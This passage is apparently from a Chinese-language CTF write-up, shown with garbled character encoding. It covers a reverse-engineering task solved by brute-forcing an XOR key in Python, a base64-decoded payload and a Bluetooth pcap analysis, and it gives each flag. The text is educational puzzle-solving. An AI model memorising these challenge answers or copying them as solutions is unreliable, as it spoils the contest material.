operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>istream<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cin<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v11 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>  v15 <span class="token operator">=</span> <span class="token keyword">operator</span> <span class="token keyword">new</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v11<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&gt;&gt;</span><span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cin<span class="token punctuation">,</span> i <span class="token operator">+</span> v15<span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"You have input sth."</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>ostream<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"I will mix them with the enc_flag!"</span><span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>ostream<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">37</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> v11<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>      v10 <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>k <span class="token operator">+</span> v15<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putchar</span><span class="token punctuation">(</span>v10 <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v16 <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"\nMaybe you have found the `flag`\n"</span><span class="token punctuation">,</span> v9<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>æ˜¯ Cpp å”‰ã€‚è™½ç„¶é€†å‘å‡ºæ¥æœ‰ç‚¹ä¸‘emmmã€‚</p><p>å¤§æ¦‚æ„æ€æ˜¯å…ˆè®©ä½ è¾“å…¥ä¸€ä¸ª <code>magic number</code>ï¼Œå¦‚æœ<code>v11 &lt;= 9</code>åˆ™è¿”å› -1 é€€å‡ºï¼Œè¯´æ˜è¾“å…¥çš„æ•°è¦å¤§äº9ã€‚</p><p>ç„¶åä¾æ¬¡è¾“å…¥<code>v11</code>ä¸ªæ•°ï¼Œå­˜åˆ°<code>v15</code>åŠä¹‹åçš„ç©ºé—´å†…ã€‚</p><p>åé¢è¾“å‡ºäº†ä¸€ä¸ª <code>enc_flag</code>ã€‚é‡ç‚¹å°±æ˜¯è¿™å‡ å¥å˜›ã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">37</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> v11<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>      v10 <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>k <span class="token operator">+</span> v15<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putchar</span><span class="token punctuation">(</span>v10 <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v16 <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"\nMaybe you have found the `flag`\n"</span><span class="token punctuation">,</span> v9<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ­£å¥½å‰é¢é‚£ä¸²æ•°å­—å°±æœ‰38ä¸ªã€‚çœ‹æ¥èµ·å§‹çš„å‡ ä¸ªå­—ç¬¦ä¸º <code>flag</code>ã€‚</p><p><code>v10</code>ä¾æ¬¡å’Œè¾“å…¥çš„æ¯ä¸ªæ•°å¼‚æˆ–ä¸€ä¸‹ï¼Œå†è¾“å‡º<code>v10</code>å’Œæœ€å¼€å§‹é‚£ä¸²æ•°å­—å¼‚æˆ–çš„ç»“æœã€‚</p><p><strong>é€†å‘çš„è¯ï¼Œåªè¦æ‰¾åˆ° <code>flag</code> å°±å®Œäº‹äº†ï¼</strong></p><p>äºæ˜¯ç›´æ¥çˆ†ç ´å¥½äº†ï¼</p><p><strong>Expï¼š</strong></p><p>è¾“äº†å‡ ä¸ªæ•°å­—è§‰å¾—å¤ªéº»çƒ¦äº†ï¼Œäºæ˜¯ç›´æ¥<strong>æ­£åˆ™åŒ¹é…</strong>å¥½äº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> res <span class="token operator">=</span> <span class="token triple-quoted-string string">"""v16 = 38;  v17 = 44;  v18 = 33;  v19 = 39;  v20 = 59;  v21 = 35;  v22 = 34;  v23 = 115;  v24 = 117;  v25 = 114;  v26 = 113;  v27 = 33;  v28 = 36;  v29 = 117;  v30 = 118;  v31 = 119;  v32 = 35;  v33 = 120;  v34 = 38;  v35 = 114;  v36 = 117;  v37 = 113;  v38 = 38;  v39 = 34;  v40 = 113;  v41 = 114;  v42 = 117;  v43 = 114;  v44 = 36;  v45 = 112;  v46 = 115;  v47 = 118;  v48 = 121;  v49 = 112;  v50 = 35;  v51 = 37;  v52 = 121;  v53 = 61;"""</span>t <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'v\d{2} = (\d+);'</span><span class="token punctuation">)</span>result <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>t<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token comment"># print(result)</span>l <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token comment"># [38, 44, 33, 39, 59, 35, 34, 115, 117, 114, 113, 33, 36, 117, 118, 119, 35, 120, 38, 114, 117, 113, 38, 34, 113, 114, 117, 114, 36, 112, 115, 118, 121, 112, 35, 37, 121, 61]</span></code></pre><p>å¾—åˆ°ä¸€ç³»åˆ—çš„æ•°å­—ï¼Œè½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ä¸Šé¢ç”¨äº† mapï¼Œä¸‹é¢è¿™é‡Œç”¨ç”¨ç”Ÿæˆå¼çš„å†™æ³•ï¼Œå˜»å˜»ã€‚</p><p>è€Œåå…ˆæ‰¾å‡º<code>flag</code>å¯¹åº”çš„<code>v10</code>ï¼Œå†ç”¨å®ƒæ¥å¼‚æˆ–å°±å®Œäº‹äº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">l_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> l<span class="token punctuation">]</span>s2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>l_str<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token comment"># &amp;,!';#"surq!$uvw#x&amp;ruq&amp;"qrur$psvyp#%y=</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> i<span class="token punctuation">)</span>    <span class="token keyword">if</span> tmp <span class="token operator">==</span> <span class="token string">'f'</span><span class="token keyword">or</span> tmp <span class="token operator">==</span> <span class="token string">'F'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token comment"># f 64</span><span class="token comment"># F 96</span>final <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> x <span class="token keyword">in</span> s2<span class="token punctuation">:</span>    final <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>final<span class="token punctuation">)</span><span class="token comment"># flag{cb3521ad567c8f251fb1252d03690ce9}</span></code></pre><p>å¾—åˆ° flagï¼š</p><p><code>flag{cb3521ad567c8f251fb1252d03690ce9}</code></p><br><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ï¼ˆç­¾åˆ°é¢˜ï¼‰6Gè¿˜è¿œå—ï¼Ÿ"><a href="#ï¼ˆç­¾åˆ°é¢˜ï¼‰6Gè¿˜è¿œå—ï¼Ÿ" class="headerlink" title="ï¼ˆç­¾åˆ°é¢˜ï¼‰6Gè¿˜è¿œå—ï¼Ÿ"></a>ï¼ˆç­¾åˆ°é¢˜ï¼‰6Gè¿˜è¿œå—ï¼Ÿ</h3><blockquote><p>5Géƒ½æ¥äº†ï¼Œ6Gè¿˜è¿œå—ï¼Ÿ6Gä¸‹è¿˜éœ€è¦å¼€ä¼šå‘˜æ‰èƒ½é«˜é€Ÿä¸‹è½½å—ï¼Ÿè¯·æäº¤ DASCTF{} é‡Œçš„å†…å®¹ã€‚</p><p><a href="http://server.zhaoj.in:8888/1GTest.file">http://server.zhaoj.in:8888/1GTest.file</a> or <a href="http://das.wetolink.com:8888/1GTest.file">http://das.wetolink.com:8888/1GTest.file</a> </p></blockquote><p>æ–‡ä»¶å¤§å°æ˜¾ç¤ºæ˜¯ 977MBï¼Œç„¶è€Œä¸‹è½½é€Ÿåº¦æ…¢åˆ° 1KB/s ä¸åˆ°ï¼Œè¿˜ä¸å…è®¸å¤šçº¿ç¨‹â€¦â€¦</p><p>æƒ³åˆ°ä¼°è®¡æ˜¯å‡çš„æ–‡ä»¶ï¼Œæ¯•ç«Ÿæ˜¯ç­¾åˆ°é¢˜ï¼Œåº”è¯¥ä¸éš¾çš„ã€‚ï¼ˆæ‰ä¸åƒä¸Šä¸ªæ¯”èµ›å‡çš„ç­¾åˆ°</p><p>äºæ˜¯æŒ‰ä¸‹ F12ï¼Œå°±çœ‹æ¥æ”¶åˆ°çš„è¿™éƒ¨åˆ† payload å¥½äº†ã€‚</p><p>æˆ–è€…å°±æ¥æ”¶ä¸€éƒ¨åˆ†ç„¶åæˆªæ–­ä¹Ÿè¡Œã€‚</p><p><img src="/2020/04/25/CTF_2020DASCTF_April/image-20200425164843561.png" alt="payload"></p><pre class="language-none"><code class="language-none">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</code></pre><p>æ‰”å» base64 è§£å¯†ï¼Œå°±å¯ä»¥å¾—åˆ° flagã€‚</p><p><img src="/2020/04/25/CTF_2020DASCTF_April/image-20200425164902461.png" alt="base64 è§£å¯†"></p><p>æœç„¶ <strong>flag å°±åœ¨æ–‡ä»¶æœ€å¼€å¤´</strong>å“ˆå“ˆå“ˆ~</p><p><code>DASCTF{welcome_to_DAS_Ap1r1}</code></p><h3 id="blueshark"><a href="#blueshark" class="headerlink" title="blueshark"></a>blueshark</h3><blockquote><p>Can you dig something you want out from the sea-colored beautiful shark?</p></blockquote><p><strong>é¢˜ç›®é™„ä»¶ï¼š</strong><a href="2004225e9ff0cd86ee4.pcapng">åœ¨è¿™é‡Œ</a></p><p>ä¸€ä¸ªæµé‡åŒ…ï¼Œçœ‹äº†æ˜¯è“ç‰™åè®®ï¼Œå‘œåˆæ˜¯æ²¡è§è¿‡çš„ã€‚å‘ç° Wireshark è¿˜å¯ä»¥åˆ†æè“ç‰™æ•°æ®åŒ…å”‰ã€‚ï¼ˆï¼ˆå…¶å®å¥½å¤šéƒ½å¯ä»¥</p><p>binwalk å‘ç°äº†ä¸€ä¸ª 7z çš„å‹ç¼©åŒ…ï¼Œç›´æ¥å½“æˆå‹ç¼©åŒ…æ‰“å¼€ï¼Œå‘ç°æœ‰ä¸ª <code>password_is_Bluetooth_PIN.txt</code>æ–‡ä»¶ï¼Œçœ‹æ¥å¾—æ‰¾ PIN äº†ã€‚</p><p>ä»æ•°æ®åŒ…è¿™é‡Œä¹Ÿæ‰¾åˆ°äº†è¿™ä¸ªå‹ç¼©åŒ…ã€‚</p><p><img src="/2020/04/25/CTF_2020DASCTF_April/image-20200425213537357.png" alt="what_you_want"></p><p>æœ¬æ¥ä»¥ä¸º PIN å°±æ˜¯4ä½çš„ï¼Œè¿˜æƒ³çˆ†ç ´ä¸€æ³¢ã€‚ã€‚ç»“æœå‘ç°ä¸æ˜¯ã€‚</p><p>åé¢å¤§ä½¬è¯´æ˜¯åœ¨ç½‘ç»œæµé‡Œå¯ä»¥æ‰¾åˆ° PINï¼Œemmmï¼Ÿ</p><p>å™¢ï¼ŒCtrl + Fï¼Œé€‰æ‹© åˆ†ç»„è¯¦æƒ… æˆ–è€… åˆ†ç»„åˆ—è¡¨ï¼Œå­—ç¬¦ä¸² æˆ–è€… æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿™æ ·æœå°±æ‰¾åˆ°äº†ã€‚</p><p><img src="/2020/04/25/CTF_2020DASCTF_April/image-20200425234819265.png" alt="PIN"></p><p>PIN å°±æ˜¯ <code>141854</code>ã€‚</p><p>ç”¨æ¥è§£å‹å°±å¯ä»¥å¾—åˆ° flagã€‚</p><p><code>flag{6da01c0a419b0b56ca8307fc9ab623eb}</code></p><blockquote><p>å¯¼å‡ºè¿™ä¸ªå‹ç¼©åŒ…å¯ä»¥å…ˆé€‰ä¸­ï¼Œå† <code>Ctrl + Shift + X</code>å¯¼å‡ºåˆ†ç»„å­—èŠ‚æµã€‚è€Œåä¿å­˜åˆ°æ–‡ä»¶æ‰“å¼€å°±è¡Œã€‚</p><p><img src="/2020/04/25/CTF_2020DASCTF_April/export.png" alt="å¯¼å‡ºåˆ†ç»„å­—èŠ‚æµ"></p></blockquote><blockquote><p>åé¢æœ‰ç©ºå†äº†è§£ä¸€ä¸‹å†…å­˜å–è¯ä»€ä¹ˆçš„ï¼ˆè¿™æ¬¡å¥½åƒæœ‰ä¸€é¢˜</p></blockquote><br><hr><p><strong>é¢˜ç›®ç‰ˆæƒå½’å®˜æ–¹æ‰€æœ‰ã€‚</strong></p><p><strong>ä»¥ä¸Šå†…å®¹ä»…ä¾›å­¦ä¹ ç 